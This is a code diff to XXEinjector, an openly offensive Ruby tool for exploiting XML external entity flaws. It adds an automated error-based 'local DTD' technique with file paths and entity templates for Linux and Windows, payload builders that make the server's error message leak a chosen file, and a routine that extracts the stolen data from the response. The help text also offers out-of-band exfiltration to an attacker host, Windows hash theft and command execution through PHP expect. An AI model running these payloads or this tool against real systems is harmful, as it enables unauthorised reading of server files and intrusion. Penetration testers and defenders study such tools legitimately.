@@ -9,6 +9,13 @@ require 'net/https'
 require 'base64'
 require 'readline'
 
+# URI.encode was removed in Ruby 3.0, RFC2396 parser keeps its escaping rules
+$uriparser = URI::DEFAULT_PARSER.respond_to?(:escape) ? URI::DEFAULT_PARSER : URI::RFC2396_Parser.new
+
+def uriencode(str)
+	$uriparser.escape(str)
+end
+
 # CONFIGURE
 host = "" # our external ip
 $path = "" # path to enumerate
@@ -33,6 +40,24 @@ hashes = "n" # steal Windows hashes
 upload = "" # upload this file into temp directory using Java jar schema
 expect = "" # command that gets executed using PHP expect
 $xslt = "n" # tests for XSLT
+$localdtd = "" # local DTD technique - template name, os, "auto" or "list"
+$ldtdfile = "" # file with custom local DTD templates
+$ldtdsink = "file:///nonexistent/" # nonexistent path that leaks the file in the error message
+$ldtdtpls = nil # templates still worth trying
+$ldtdok = "" # template that already worked
+$ldtdshapes = ["pe", "system"] # how the local DTD is pulled in - parameter entity or external subset
+$brutelines = nil # file with paths to bruteforce, read once
+
+# local DTD templates - a DTD that is already on the target is repurposed by
+# redefining one of its parameter entities. Value start and tail close the
+# declaration that entity is used in, so our own declarations end up on top
+# level. Format: name|os|dtd path|entity|value start|tail
+$localdtds = [
+	'docbookx|linux|file:///usr/share/yelp/dtd/docbookx.dtd|ISOamso||',
+	'fonts|linux|file:///usr/share/xml/fontconfig/fonts.dtd|constant|aaa)>|<!ELEMENT aa (bb',
+	'cim20|windows|file:///C:\Windows\System32\wbem\xml\cim20.dtd|CIMName|>|<!ELEMENT aa "bb"',
+	'xwizard|windows|file:///C:\Windows\System32\xwizard.dtd|onerrortypes|(aa) #IMPLIED>|<!ATTLIST attxx aa "bb"'
+]
 
 $test = false # test mode, shows only payload
 $dtdi = "y" # if yes then DTD is injected automatically
@@ -40,6 +65,8 @@ $rproto = "file" # file or netdoc protocol to retrieve data
 $output = "brute.log" # output file for brute and logger modes
 $verbose = "n" # verbose messaging
 timeout = 10 # timeout for receiving responses
+timeoutset = "n" # whether --timeout was given explicitly
+rhostset = "n" # whether --rhost was given explicitly
 $contimeout = 30 # timeout used to close connection with server
 
 $port = 0 # remote host application port
@@ -91,6 +118,7 @@ ARGV.each do |arg|
 	gopher_port = arg.split("=")[1] if arg.include?("--gopherport=")
 	jar_port = arg.split("=")[1] if arg.include?("--jarport=")
 	timeout = Integer(arg.split("=")[1]) if arg.include?("--timeout=")
+	timeoutset = "y" if arg.include?("--timeout=")
 	hashes = "y" if arg.include?("--hashes")
 	upload = arg.split("=")[1] if arg.include?("--upload=")
 	expect = arg.split("=")[1] if arg.include?("--expect=")
@@ -98,6 +126,10 @@ ARGV.each do |arg|
 	$urlencode = "y" if arg.include?("--urlencode")
 	$dtdi = "n" if arg.include?("--nodtd")
 	$xslt = "y" if arg.include?("--xslt")
+	$localdtd = arg.split("=")[1] if arg.include?("--localdtd=")
+	$localdtd = "auto" if arg == "--localdtd"
+	$ldtdfile = arg.split("=")[1] if arg.include?("--localdtdfile=")
+	$ldtdsink = arg.split("=")[1] if arg.include?("--localdtdsink=")
 	$direct = arg.split("=")[1] if arg.include?("--direct=")
 	$logger = "y" if arg.include?("--logger")
 	$brute = "logger" if arg.include?("--logger")
@@ -107,6 +139,7 @@ ARGV.each do |arg|
 	$contimeout = Integer(arg.split("=")[1]) if arg.include?("--contimeout=")
 	$port = Integer(arg.split("=")[1]) if arg.include?("--rport=")
 	$remote = arg.split("=")[1] if arg.include?("--rhost=")
+	rhostset = "y" if arg.include?("--rhost=")
 	$test = true if arg.include?("--test")
 	cdata = "y" if arg.include?("--cdata")
 end
@@ -131,9 +164,29 @@ elsif ARGV.include? "--direct-xml"
 	puts ""
 	exit(1)
 
+# show built-in local DTD templates
+elsif ARGV.include? "--localdtd=list"
+	puts ""
+	puts "Built-in local DTD templates:"
+	puts "name|os|dtd path|entity|value start|tail"
+	$localdtds.each { |l| puts "  " + l }
+	puts ""
+	puts "Pick one with --localdtd=docbookx, all of an OS with --localdtd=linux,"
+	puts "or try every one with --localdtd. Templates for other DTDs can be added"
+	puts "in a file of the same format and loaded with --localdtdfile=/tmp/dtds.txt."
+	puts ""
+	puts "Each template is tried in two shapes: the published one that pulls the DTD"
+	puts "in with a parameter entity, and one that loads it as the external subset"
+	puts "(<!DOCTYPE x SYSTEM \"dtd\" [ ... ]>), which is the shape libxml accepts."
+	puts ""
+	exit(1)
+
 # show sample direct exploitation XML using local DTD
 elsif ARGV.include? "--localdtd-xml"
 	puts ""
+	puts "Payload to put in the request file by hand. SuperClass and the path have to"
+	puts "match a DTD that is present on the target. --localdtd automates this and"
+	puts "--localdtd=list prints the templates it knows."
 	puts "<!DOCTYPE m [ <!ENTITY % local_dtd SYSTEM \"PUT_HERE_PATH_TO_LOCAL_DTD\"><!ENTITY % SuperClass '><!ENTITY &#x25; file SYSTEM \"XXEINJECT\"><!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">&#x25;eval;&#x25;error;'>%local_dtd;]>"
 	puts ""
 	exit(1)
@@ -152,7 +205,7 @@ elsif ARGV.include? "--cdata-xml"
 	exit(1)
 
 # show main menu
-elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct == "" && $logger == "n") || ($file == "" && $logger == "n") || ($path == "" && $brute == "" && hashes == "n" && upload == "" && expect == "" && enumports == "" && $xslt == "n" && $logger == "n")
+elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n" && $localdtd == "") || (host == "" && $direct == "" && $logger == "n" && $localdtd == "") || ($file == "" && $logger == "n") || ($path == "" && $brute == "" && hashes == "n" && upload == "" && expect == "" && enumports == "" && $xslt == "n" && $logger == "n" && $localdtd == "")
 	puts "XXEinjector by Jakub Pa\u0142aczy\u0144ski"
 	puts ""
 	puts "XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications."
@@ -168,7 +221,7 @@ elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct =
 	puts "  --rport	Remote host's TCP port. Use this argument only for requests without Host header and for non-default values. (--rport=8080)"
 	puts ""
 	puts "  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)"
-	puts "  --direct	Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --direct-xml to see how XML in request file should look like or --localdtd-xml if you want to use local DTD during exploitation. In case of any problems with start and end marks when special characters are present in reponse before or after output data please use Burp Proxy match and replace option to replace that. (--direct=UNIQUEMARKSTART,UNIQUEMARKEND)"
+	puts "  --direct	Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --direct-xml to see how XML in request file should look like or --localdtd-xml if you want to build a local DTD payload by hand. Use --localdtd for the automated local DTD technique. In case of any problems with start and end marks when special characters are present in reponse before or after output data please use Burp Proxy match and replace option to replace that. (--direct=UNIQUEMARKSTART,UNIQUEMARKEND)"
 	puts "  --cdata	Improve direct exploitation with CDATA. Data is retrieved directly, however OOB is used to construct CDATA payload. Specify --cdata-xml to see how request should look like in this technique."
 	puts "  --2ndfile	File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)"
 	puts "  --phpfilter	Use PHP filter to base64 encode target file before sending."
@@ -179,6 +232,9 @@ elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct =
 	puts "  --expect	Uses PHP expect extension to execute arbitrary system command. Best works with HTTP and PHP filter. (--expect=ls)"
 	puts "  --upload	Uploads specified file using Java jar schema into temp file. (--upload=/tmp/upload.txt)"
 	puts "  --xslt	Tests for XSLT injection."
+	puts "  --localdtd	Local DTD technique. Retrieves files in band, from an error message, by repurposing a DTD that is already on the target. Needs --brute. Use --localdtd to try every built-in template, --localdtd=linux/windows for one OS, --localdtd=NAME for a single one or --localdtd=list to see them. (--localdtd=docbookx)"
+	puts "  --localdtdfile	File with custom local DTD templates in the same format as --localdtd=list prints, one per line. (--localdtdfile=/tmp/dtds.txt)"
+	puts "  --localdtdsink	Nonexistent path that leaks the file in the error message. (--localdtdsink=file:///nonexistent/)"
 	puts ""
 	puts "  --ssl		Use SSL."
 	puts "  --proxy	Proxy to use. (--proxy=127.0.0.1:8080)"
@@ -192,7 +248,7 @@ elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct =
 	puts "  --urlencode	URL encode injected DTD. This is default for URI."
 	puts "  --nodtd	If you want to put DTD in request by yourself. Specify \"--oob-xml\" to show how DTD should look like."
 	puts "  --output	Output file for bruteforcing and logger mode. By default it logs to brute.log in current directory. (--output=/tmp/out.txt)"
-	puts "  --timeout	Timeout for receiving file/directory content. (--timeout=20)"
+	puts "  --timeout	Timeout for receiving file/directory content. Defaults to 10, or to 1 with --direct and --localdtd, where results come back in the response and there is nothing to wait for. (--timeout=20)"
 	puts "  --contimeout	Timeout for closing connection with server. This is used to prevent DoS condition. (--contimeout=20)"
 	puts "  --fast	Skip asking what to enumerate. Prone to false-positives."
 	puts "  --verbose	Show verbose messages."
@@ -218,6 +274,8 @@ elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct =
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls"
 	puts "  Testing for XSLT injection:"
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --xslt"
+	puts "  Retrieving files through an error message with a local DTD:"
+	puts "  ruby #{__FILE__} --file=/tmp/req.txt --brute=/tmp/filenames.txt --localdtd --phpfilter"
 	puts "  Log requests only:"
 	puts "  ruby #{__FILE__} --logger --oob=http --output=/tmp/out.txt"
 	puts ""
@@ -246,34 +304,96 @@ if $proxy == ""
 	$proxy_port = nil
 end
 
+# read a request file into request line, headers and body. Tolerates what
+# people really export: CRLF or lone CR line endings, a UTF-8 BOM, no trailing
+# newline, a whitespace-only separator line and a request without a body.
+def readreq(path, what)
+	if !File.exist?(path)
+		puts "[-] Cannot find #{what} file: #{path}"
+		exit(1)
+	end
+	raw = File.binread(path).force_encoding("BINARY")
+	raw = raw[3..-1].to_s if raw[0, 3] == "\xEF\xBB\xBF".b
+	if raw.strip.empty?
+		puts "[-] #{what.capitalize} file is empty: #{path}"
+		exit(1)
+	end
+
+	# split into lines, keeping their terminators, so the body stays verbatim
+	lines = raw.scan(/[^\r\n]*(?:\r\n|\r|\n)|[^\r\n]+\z/)
+	lines.shift while !lines.empty? && lines[0].strip.empty?
+
+	# the first blank or whitespace-only line separates headers from body
+	sepidx = nil
+	lines.each_index do |n|
+		next if n == 0
+		if lines[n].strip.empty?
+			sepidx = n
+			break
+		end
+	end
+	head = sepidx.nil? ? lines : lines[0, sepidx]
+	body = sepidx.nil? ? "" : lines[(sepidx + 1)..-1].to_a.join
+
+	reqline = head[0].to_s.strip
+	target = reqline.split(" ")[1].to_s
+	if reqline.split(" ").size < 2 || !(target.start_with?("/") || target.start_with?("http") || target == "*")
+		puts "[-] First line of #{what} file is not an HTTP request line: #{reqline}"
+		puts "[-] It should look like: POST /path/file.php HTTP/1.1"
+		exit(1)
+	end
+	lines = head[1..-1].to_a
+
+	nobody = ['GET', 'HEAD', 'TRACE', 'OPTIONS', 'MOVE', 'COPY', 'DELETE'].include?(reqline.split(" ")[0].to_s.upcase)
+	if sepidx.nil? && !nobody
+		puts "[-] No empty line between headers and body in #{what} file."
+		puts "[-] Add an empty line after the last header, before the XML."
+		exit(1)
+	end
+
+	headers = []
+	lines.each do |raw_line|
+		line = raw_line.sub(/\r?\n\z/, "").sub(/\r\z/, "")
+		next if line.strip.empty?
+		if line.include?(":")
+			headers.push(line)
+		else
+			puts "[-] Ignoring line in #{what} file, it is not a header: #{line.strip}"
+		end
+	end
+	[reqline, headers, body]
+end
+
+# read the request files once
+if $file != ""
+	$reqline, $reqheaders, $reqbody = readreq($file, "request")
+end
+if $secfile != ""
+	$secreqline, $secreqheaders, $secreqbody = readreq($secfile, "second request")
+end
+
 # get connection host and port
 if $logger == "n"
-	z = 1
-	loop do
-		begin
-			break if File.readlines($file)[z].chomp.empty?
-			if File.readlines($file)[z].include?("Host: ")
-				$remote = File.readlines($file)[z].split(" ")[1]
-				if $remote.include?(":")
-					$port = $remote.split(":")[1]
-					$remote = $remote.split(":")[0]
-				end
-			end
-		rescue
-			puts "[-] Wrong HTTP file format."
-			exit(1)
+	hostline = $reqheaders.find { |h| h.match(/^Host[ \t]*:/i) }
+	if !hostline.nil? && rhostset == "n"
+		value = hostline.split(":", 2)[1].to_s.strip
+		if value.include?(":")
+			$remote = value.split(":")[0]
+			$port = value.split(":")[1]
+		else
+			$remote = value
 		end
-		z = z + 1
 	end
 	if $port == 0
 		if $proto == "http"
 			$port = 80
 		else
 			$port = 443
-		end	
+		end
 	end
 	if $remote == ""
-		puts "[-] Cannot retrieve hostname."
+		puts "[-] Cannot find Host header in the request file."
+		puts "[-] Use --rhost to set the target and --rport for a non-default port."
 		exit(1)
 	end
 end
@@ -284,10 +404,10 @@ def configreq()
 	found = 0 # for detecting injected DTD
 
 	# assign HTTP method
-	$method = File.readlines($file)[0].split(" ")[0]
+	$method = $reqline.split(" ")[0]
 
 	# get URI path
-	$uri = File.readlines($file)[0].split(" ")[1]
+	$uri = $reqline.split(" ")[1]
 	if $dtdi == "y"
 		turi = CGI.unescape($uri).gsub("+", " ")
 		if turi.include?("XXEINJECT")
@@ -295,33 +415,33 @@ def configreq()
 				$uri = $uri.sub("XXEINJECT", $rproto + ":///#{$directpath}")
 				found = found + 1
 			elsif $xslt == "n"
-				$uri = $uri.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+"))
+				$uri = $uri.sub("XXEINJECT", uriencode($dtd).gsub("%20", "+"))
 				found = found + 1
 			else
-				$uri = $uri.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+				$uri = $uri.sub("XXEINJECT", uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 				found = found + 1
 			end
 			#puts "DTD injected." if $verbose == "y"
 		elsif turi.include?("<?xml") && $direct == ""
 			if $xslt == "n"
-				$uri = $uri.sub("?>", "?>" + URI.encode($dtd).gsub("%20", "+"))
-				$uri = $uri.sub(/(\?%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
-				$uri = $uri.sub(/(%3f>)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
-				$uri = $uri.sub(/(%3f%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
+				$uri = $uri.sub("?>", "?>" + uriencode($dtd).gsub("%20", "+"))
+				$uri = $uri.sub(/(\?%3e)/i, '\1' + uriencode($dtd).gsub("%20", "+"))
+				$uri = $uri.sub(/(%3f>)/i, '\1' + uriencode($dtd).gsub("%20", "+"))
+				$uri = $uri.sub(/(%3f%3e)/i, '\1' + uriencode($dtd).gsub("%20", "+"))
 				#puts "DTD injected." if $verbose == "y"
 				found = found + 1
 			else
 				if turi.match(/(\<\?xml)(.*)(&)/i)
-					$uri = $uri.sub(/(\<\?xml)(.*)(&)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
-					$uri = $uri.sub(/(%3c%3fxml)(.*)(&)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
-					$uri = $uri.sub(/(%3c\?xml)(.*)(&)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
-					$uri = $uri.sub(/(\<%3fxml)(.*)(&)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+					$uri = $uri.sub(/(\<\?xml)(.*)(&)/i, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+					$uri = $uri.sub(/(%3c%3fxml)(.*)(&)/i, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+					$uri = $uri.sub(/(%3c\?xml)(.*)(&)/i, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+					$uri = $uri.sub(/(\<%3fxml)(.*)(&)/i, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
 					found = found + 1
 				elsif turi.match(/(\<\?xml)(.*)/i)
-					$uri = $uri.sub(/(\<\?xml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-					$uri = $uri.sub(/(%3c%3fxml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-					$uri = $uri.sub(/(%3c\?xml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-					$uri = $uri.sub(/(\<%3fxml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+					$uri = $uri.sub(/(\<\?xml)(.*)/i, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+					$uri = $uri.sub(/(%3c%3fxml)(.*)/i, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+					$uri = $uri.sub(/(%3c\?xml)(.*)/i, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+					$uri = $uri.sub(/(\<%3fxml)(.*)/i, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 					found = found + 1
 				end
 				#puts "DTD injected." if $verbose == "y"
@@ -330,12 +450,10 @@ def configreq()
 	end
 
 	# get headers
-	i = 1
 	$headers = Hash.new
-	loop do
-		break if File.readlines($file)[i].chomp.empty?
-		if !File.readlines($file)[i].include?("Host: ")
-			header = File.readlines($file)[i].chomp
+	$reqheaders.each do |raw|
+		if !raw.match(/^Host[ \t]*:/i)
+			header = raw
 			if $dtdi == "y"
 				if header.include?("XXEINJECT")
 					if $direct != ""
@@ -343,9 +461,9 @@ def configreq()
 						found = found + 1
 					elsif $urlencode == "y"
 						if $xslt == "n"
-							header = header.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+").gsub(";", "%3B"))
+							header = header.sub("XXEINJECT", uriencode($dtd).gsub("%20", "+").gsub(";", "%3B"))
 						else
-							header = header.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D").gsub(";", "%3B"))
+							header = header.sub("XXEINJECT", uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D").gsub(";", "%3B"))
 						end
 						found = found + 1
 					else
@@ -361,19 +479,18 @@ def configreq()
 			end
 			if header.include?("Accept-Encoding") && $direct != ""
 			else
-				$headers[header.split(": ")[0]] = header.split(": ")[1]
+				# split once, a value may contain ": " as well
+				name, value = header.split(":", 2)
+				$headers[name.strip] = value.to_s.strip
 			end
 		end
-		i = i + 1
 	end
 
 	# get body
-	i = i + 1
 	$post = ""
 	postfind = 0
-	loop do
-		break if File.readlines($file)[i].nil?
-		postline = File.readlines($file)[i]
+	$reqbody.lines.each do |line|
+		postline = line
 		if $dtdi == "y"
 			tline = CGI.unescape(postline).gsub("+", " ")
 			if tline.include?("XXEINJECT") && $xslt == "n"
@@ -382,9 +499,9 @@ def configreq()
 					found = found + 1
 				elsif $urlencode == "y"
 					if $xslt == "n"
-						postline = postline.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+"))
+						postline = postline.sub("XXEINJECT", uriencode($dtd).gsub("%20", "+"))
 					else
-						postline = postline.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+						postline = postline.sub("XXEINJECT", uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 					end
 					found = found + 1
 				else
@@ -400,10 +517,10 @@ def configreq()
 				postfind = 1
 			elsif tline.include?("<?xml") && $xslt == "n" && $direct == ""
 				if $urlencode == "y"
-						postline = postline.sub("?>", "?>" + URI.encode($dtd).gsub("%20", "+"))
-						postline = postline.sub(/(\?%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
-						postline = postline.sub(/(%3f>)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
-						postline = postline.sub(/(%3f%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
+						postline = postline.sub("?>", "?>" + uriencode($dtd).gsub("%20", "+"))
+						postline = postline.sub(/(\?%3e)/i, '\1' + uriencode($dtd).gsub("%20", "+"))
+						postline = postline.sub(/(%3f>)/i, '\1' + uriencode($dtd).gsub("%20", "+"))
+						postline = postline.sub(/(%3f%3e)/i, '\1' + uriencode($dtd).gsub("%20", "+"))
 						found = found + 1
 				else
 						postline = postline.sub("?>", "?>" + $dtd)
@@ -418,22 +535,21 @@ def configreq()
 			end
 		end
 		$post += postline
-		i = i + 1
 	end
 	if postfind == 1
 		if $urlencode == "y"
 			if $post.match(/(\<\?xml)(.*)(&)/im) || $post.match(/(%3c%3fxml)(.*)(&)/im) || $post.match(/(%3c\?xml)(.*)(&)/im) || $post.match(/(\<%3fxml)(.*)(&)/im)
-				$post = $post.sub(/(\<\?xml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
-				$post = $post.sub(/(%3c%3fxml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
-				$post = $post.sub(/(%3c\?xml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
-				$post = $post.sub(/(\<%3fxml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+				$post = $post.sub(/(\<\?xml)(.*)(&)/im, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+				$post = $post.sub(/(%3c%3fxml)(.*)(&)/im, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+				$post = $post.sub(/(%3c\?xml)(.*)(&)/im, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+				$post = $post.sub(/(\<%3fxml)(.*)(&)/im, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
 			elsif $post.match(/(\<\?xml)(.*)/im) || $post.match(/(%3c%3fxml)(.*)/im) || $post.match(/(%3c\?xml)(.*)/im) || $post.match(/(\<%3fxml)(.*)/im)
-				$post = $post.sub(/(\<\?xml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-				$post = $post.sub(/(%3c%3fxml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-				$post = $post.sub(/(%3c\?xml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
-				$post = $post.sub(/(\<%3fxml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+				$post = $post.sub(/(\<\?xml)(.*)/im, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+				$post = $post.sub(/(%3c%3fxml)(.*)/im, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+				$post = $post.sub(/(%3c\?xml)(.*)/im, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+				$post = $post.sub(/(\<%3fxml)(.*)/im, uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 			else
-				$post = $post.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+				$post = $post.sub("XXEINJECT", uriencode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 			end
 			#puts "DTD injected." if $verbose == "y"
 			found = found + 1
@@ -484,36 +600,21 @@ end
 ### Configure request for 2nd order case ###
 if $secfile != ""
 
-	# check HTTP method
-	$secmethod = File.readlines($secfile)[0].split(" ")[0]
-
-	# get URI path
-	$securi = File.readlines($secfile)[0].split(" ")[1]
+	# check HTTP method and get URI path
+	$secmethod = $secreqline.split(" ")[0]
+	$securi = $secreqline.split(" ")[1]
 
 	# get headers
-	y = 1
 	$secheaders = Hash.new
-	loop do
-		break if File.readlines($secfile)[y].chomp.empty?
-		if !File.readlines($secfile)[y].include?("Host: ")
-			header = File.readlines($secfile)[y].chomp
-			if header.include?("Accept-Encoding")
-			else
-				$secheaders[header.split(": ")[0]] = header.split(": ")[1]
-			end
-		end
-		y = y + 1
+	$secreqheaders.each do |raw|
+		next if raw.match(/^Host[ \t]*:/i)
+		next if raw.include?("Accept-Encoding")
+		name, value = raw.split(":", 2)
+		$secheaders[name.strip] = value.to_s.strip
 	end
 
 	# get body
-	y = y + 1
-	$secpost = ""
-	loop do
-		break if File.readlines($secfile)[y].nil?
-		postline = File.readlines($secfile)[y]
-		$secpost += postline
-		y = y + 1
-	end
+	$secpost = $secreqbody
 
 	# configuring 2nd request
 	$secrequest = Net::HTTP.new($remote, $port, $proxy, $proxy_port)
@@ -575,6 +676,9 @@ def sendreq()
 			end
 		}
 	rescue Timeout::Error
+		puts "[-] Timed out waiting for the response."
+	rescue SocketError, SystemCallError, EOFError, Net::HTTPBadResponse, Net::ReadTimeout, Net::OpenTimeout, OpenSSL::SSL::SSLError => e
+		puts "[-] Request failed: #{e.class}: #{e.message}"
 	end
 end
 
@@ -610,6 +714,9 @@ def send2ndreq()
 			end
 		}
 	rescue Timeout::Error
+		puts "[-] Timed out waiting for the second response."
+	rescue SocketError, SystemCallError, EOFError, Net::HTTPBadResponse, Net::ReadTimeout, Net::OpenTimeout, OpenSSL::SSL::SSLError => e
+		puts "[-] Second request failed: #{e.class}: #{e.message}"
 	end
 end
 
@@ -691,10 +798,94 @@ def pusharr(param)
 	end
 end
 
+# parse a local DTD template: name|os|dtd path|entity|value start|tail
+def ldtdparse(line)
+	return nil if line.nil? || line.strip == "" || line.strip[0] == "#"
+	f = line.split("|", -1)
+	return nil if f.size < 4
+	{ "name" => f[0].strip, "os" => f[1].to_s.strip, "path" => f[2].to_s.strip,
+	  "entity" => f[3].to_s.strip, "vstart" => f[4].to_s, "tail" => f[5].to_s }
+end
+
+# templates to try - built-in ones plus the ones from --localdtdfile
+def ldtdtemplates()
+	tpls = []
+	$localdtds.each { |l| t = ldtdparse(l); tpls.push(t) unless t.nil? }
+	if $ldtdfile != ""
+		if not File.exist?($ldtdfile)
+			puts "[-] Local DTD template file not found: #{$ldtdfile}"
+			exit(1)
+		end
+		File.readlines($ldtdfile).each { |l| t = ldtdparse(l.chomp); tpls.push(t) unless t.nil? }
+	end
+	return tpls if $localdtd == "auto"
+	sel = tpls.select { |t| t["name"] == $localdtd || t["os"] == $localdtd }
+	if sel.empty?
+		puts "[-] No local DTD template named \"#{$localdtd}\". Use --localdtd=list to see them."
+		exit(1)
+	end
+	sel
+end
+
+# build the payload for one template, one target file and one shape
+def ldtdpayload(tpl, target, phpfilter, shape)
+	res = target
+	res = "php://filter/read=convert.base64-encode/resource=#{target}" if phpfilter == "y"
+	override = "<!ENTITY % #{tpl['entity']} '#{tpl['vstart']}" +
+		"<!ENTITY &#x25; file SYSTEM \"#{res}\">" +
+		"<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;#{$ldtdsink}&#x25;file;&#x27;>\">" +
+		"&#x25;eval;&#x25;error;#{tpl['tail']}'>"
+	if shape == "system"
+		# local DTD becomes the external subset, our redefinition is read first.
+		# libxml needs this one - it rejects the parameter entity shape with
+		# "PEReferences forbidden in internal subset"
+		"<!DOCTYPE convert SYSTEM \"#{tpl['path']}\" [#{override}]>"
+	else
+		# local DTD is pulled in with a parameter entity, as published
+		"<!DOCTYPE convert [ <!ENTITY % local_dtd SYSTEM \"#{tpl['path']}\">#{override}%local_dtd;]>"
+	end
+end
+
+# response body, empty string when the request failed or timed out
+def respbody()
+	$response.respond_to?(:body) ? $response.body.to_s : ""
+end
+
+# pull the file out of the error message that the forced URI produced
+def ldtdextract(body, phpfilter)
+	return nil if body.nil? || body == ""
+	if phpfilter == "y"
+		m = body.match(/#{Regexp.escape($ldtdsink)}([A-Za-z0-9+\/=]+)/)
+		return nil if m.nil?
+		data = Base64.decode64(m[1])
+		return nil if data == ""
+		return data
+	end
+	m = body.match(/#{Regexp.escape($ldtdsink)}([^"']+)/m)
+	return nil if m.nil?
+	m[1]
+end
+
 # initial changes
 # set longer timeout for direct exploitation
 if $direct != ""
 	$time = 30
+	# results arrive in the response itself, so there is no listener to wait for
+	timeout = 1 if timeoutset == "n"
+end
+
+# local DTD technique retrieves files in band, from the error message
+if $localdtd != ""
+	$time = 30
+	timeout = 1 if timeoutset == "n"
+	if $brute == ""
+		puts "[-] Local DTD technique needs a list of files to retrieve. Use --brute."
+		exit(1)
+	end
+	if $direct != ""
+		puts "[-] Use either --direct or --localdtd, not both."
+		exit(1)
+	end
 end
 
 # Remove first slash if unix-like path specified
@@ -723,13 +914,13 @@ $xsl = "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http:
 
 # Starting servers
 begin
